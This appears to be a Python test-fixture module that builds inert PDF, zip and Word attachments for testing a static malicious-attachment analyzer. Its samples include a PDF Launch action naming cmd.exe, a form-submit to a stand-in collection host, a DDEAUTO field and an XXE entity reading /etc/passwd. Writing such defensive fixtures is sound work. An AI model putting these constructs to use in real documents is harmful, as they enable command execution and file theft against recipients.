"""Synthetic attachment builders for the static-inspection tests (never real mail).

Every "malicious" sample only carries the STRUCTURE that the analyzer looks
for (an action dictionary, a relationship, a member name); none contains
working code.
"""
from __future__ import annotations

import io
import struct
import zipfile

import pikepdf


def pdf(*, js: bool = False, launch: bool = False, embedded: bool = False,
        open_uri: str | None = None, link_uri: str | None = None, big_link: bool = False,
        submit: bool = False, xfa: bool = False, password: str | None = None,
        js_in_object_stream: bool = False) -> bytes:
    doc = pikepdf.new()
    doc.add_blank_page(page_size=(612, 792))
    page = doc.pages[0]
    if js:
        action = doc.make_indirect(pikepdf.Dictionary(
            S=pikepdf.Name.JavaScript, JS=pikepdf.String("app.alert(1)")))
        doc.Root.OpenAction = action
    if launch:
        doc.Root.OpenAction = pikepdf.Dictionary(
            S=pikepdf.Name.Launch, F=pikepdf.String("cmd.exe"))
    if open_uri:
        doc.Root.OpenAction = pikepdf.Dictionary(S=pikepdf.Name.URI, URI=pikepdf.String(open_uri))
    if submit:
        doc.Root.OpenAction = pikepdf.Dictionary(
            S=pikepdf.Name.SubmitForm, F=pikepdf.String("https://collect.example/x"))
    if xfa:
        doc.Root.AcroForm = pikepdf.Dictionary(Fields=pikepdf.Array(), XFA=pikepdf.Array())
    if embedded:
        spec = pikepdf.AttachedFileSpec(doc, b"MZ fake", filename="note.txt")
        doc.attachments["note.txt"] = spec
    if link_uri:
        rect = [0, 0, 612, 792] if big_link else [10, 10, 60, 30]
        annot = pikepdf.Dictionary(
            Type=pikepdf.Name.Annot, Subtype=pikepdf.Name.Link, Rect=pikepdf.Array(rect),
            A=pikepdf.Dictionary(S=pikepdf.Name.URI, URI=pikepdf.String(link_uri)))
        page.obj.Annots = doc.make_indirect(pikepdf.Array([doc.make_indirect(annot)]))
    out = io.BytesIO()
    kw: dict = {}
    if password:
        kw["encryption"] = pikepdf.Encryption(user=password, owner=password + "o")
    if js_in_object_stream:
        kw["object_stream_mode"] = pikepdf.ObjectStreamMode.generate
        kw["compress_streams"] = True
    doc.save(out, **kw)
    return out.getvalue()


def zip_of(members: dict[str, bytes]) -> bytes:
    out = io.BytesIO()
    with zipfile.ZipFile(out, "w", zipfile.ZIP_DEFLATED) as zf:
        for name, data in members.items():
            zf.writestr(name, data)
    return out.getvalue()


def encrypted_flag_zip() -> bytes:
    """A zip whose single entry has the 'encrypted' general-purpose bit set."""
    data = bytearray(zip_of({"secret.pdf": b"%PDF-1.4 x"}))
    for sig, off in ((b"PK\x03\x04", 6), (b"PK\x01\x02", 8)):
        pos = data.find(sig)
        flags = struct.unpack_from("<H", data, pos + off)[0] | 0x1
        struct.pack_into("<H", data, pos + off, flags)
    return bytes(data)


_CT = (b'<?xml version="1.0"?><Types xmlns="http://schemas.openxmlformats.org/package/2006/'
       b'content-types"><Default Extension="xml" ContentType="application/xml"/></Types>')
_RELS_NS = "http://schemas.openxmlformats.org/package/2006/relationships"
_OFF = "http://schemas.openxmlformats.org/officeDocument/2006/relationships"


def _rels(*rels: tuple[str, str, bool]) -> bytes:
    body = "".join(
        f'<Relationship Id="r{i}" Type="{_OFF}/{t}" Target="{target}"'
        + (' TargetMode="External"' if ext else "") + "/>"
        for i, (t, target, ext) in enumerate(rels)
    )
    return f'<?xml version="1.0"?><Relationships xmlns="{_RELS_NS}">{body}</Relationships>'.encode()


def docx(*, macro: bool = False, template: str | None = None, dde: bool = False,
         hyperlink: str | None = None, ole: bool = False, activex: bool = False,
         xxe: bool = False) -> bytes:
    body = b"<w:p><w:r><w:t>Hello</w:t></w:r></w:p>"
    if dde:
        body += b'<w:p><w:r><w:instrText> DDEAUTO c:\\\\x\\\\y "z" </w:instrText></w:r></w:p>'
    doc = (b'<?xml version="1.0"?><w:document xmlns:w="http://schemas.openxmlformats.org/'
           b'wordprocessingml/2006/main"><w:body>' + body + b"</w:body></w:document>")
    if xxe:
        doc = (b'<?xml version="1.0"?><!DOCTYPE d [<!ENTITY x SYSTEM "file:///etc/passwd">]>'
               b"<d>&x;</d>")
    members = {"[Content_Types].xml": _CT, "word/document.xml": doc}
    doc_rels = []
    if hyperlink:
        doc_rels.append(("hyperlink", hyperlink, True))
    if doc_rels:
        members["word/_rels/document.xml.rels"] = _rels(*doc_rels)
    if template:
        members["word/_rels/settings.xml.rels"] = _rels(("attachedTemplate", template, True))
    if macro:
        members["word/vbaProject.bin"] = b"\xd0\xcf\x11\xe0 fake"
    if ole:
        members["word/embeddings/oleObject1.bin"] = b"\xd0\xcf\x11\xe0 fake"
    if activex:
        members["word/activeX/activeX1.xml"] = b"<x/>"
    return zip_of(members)
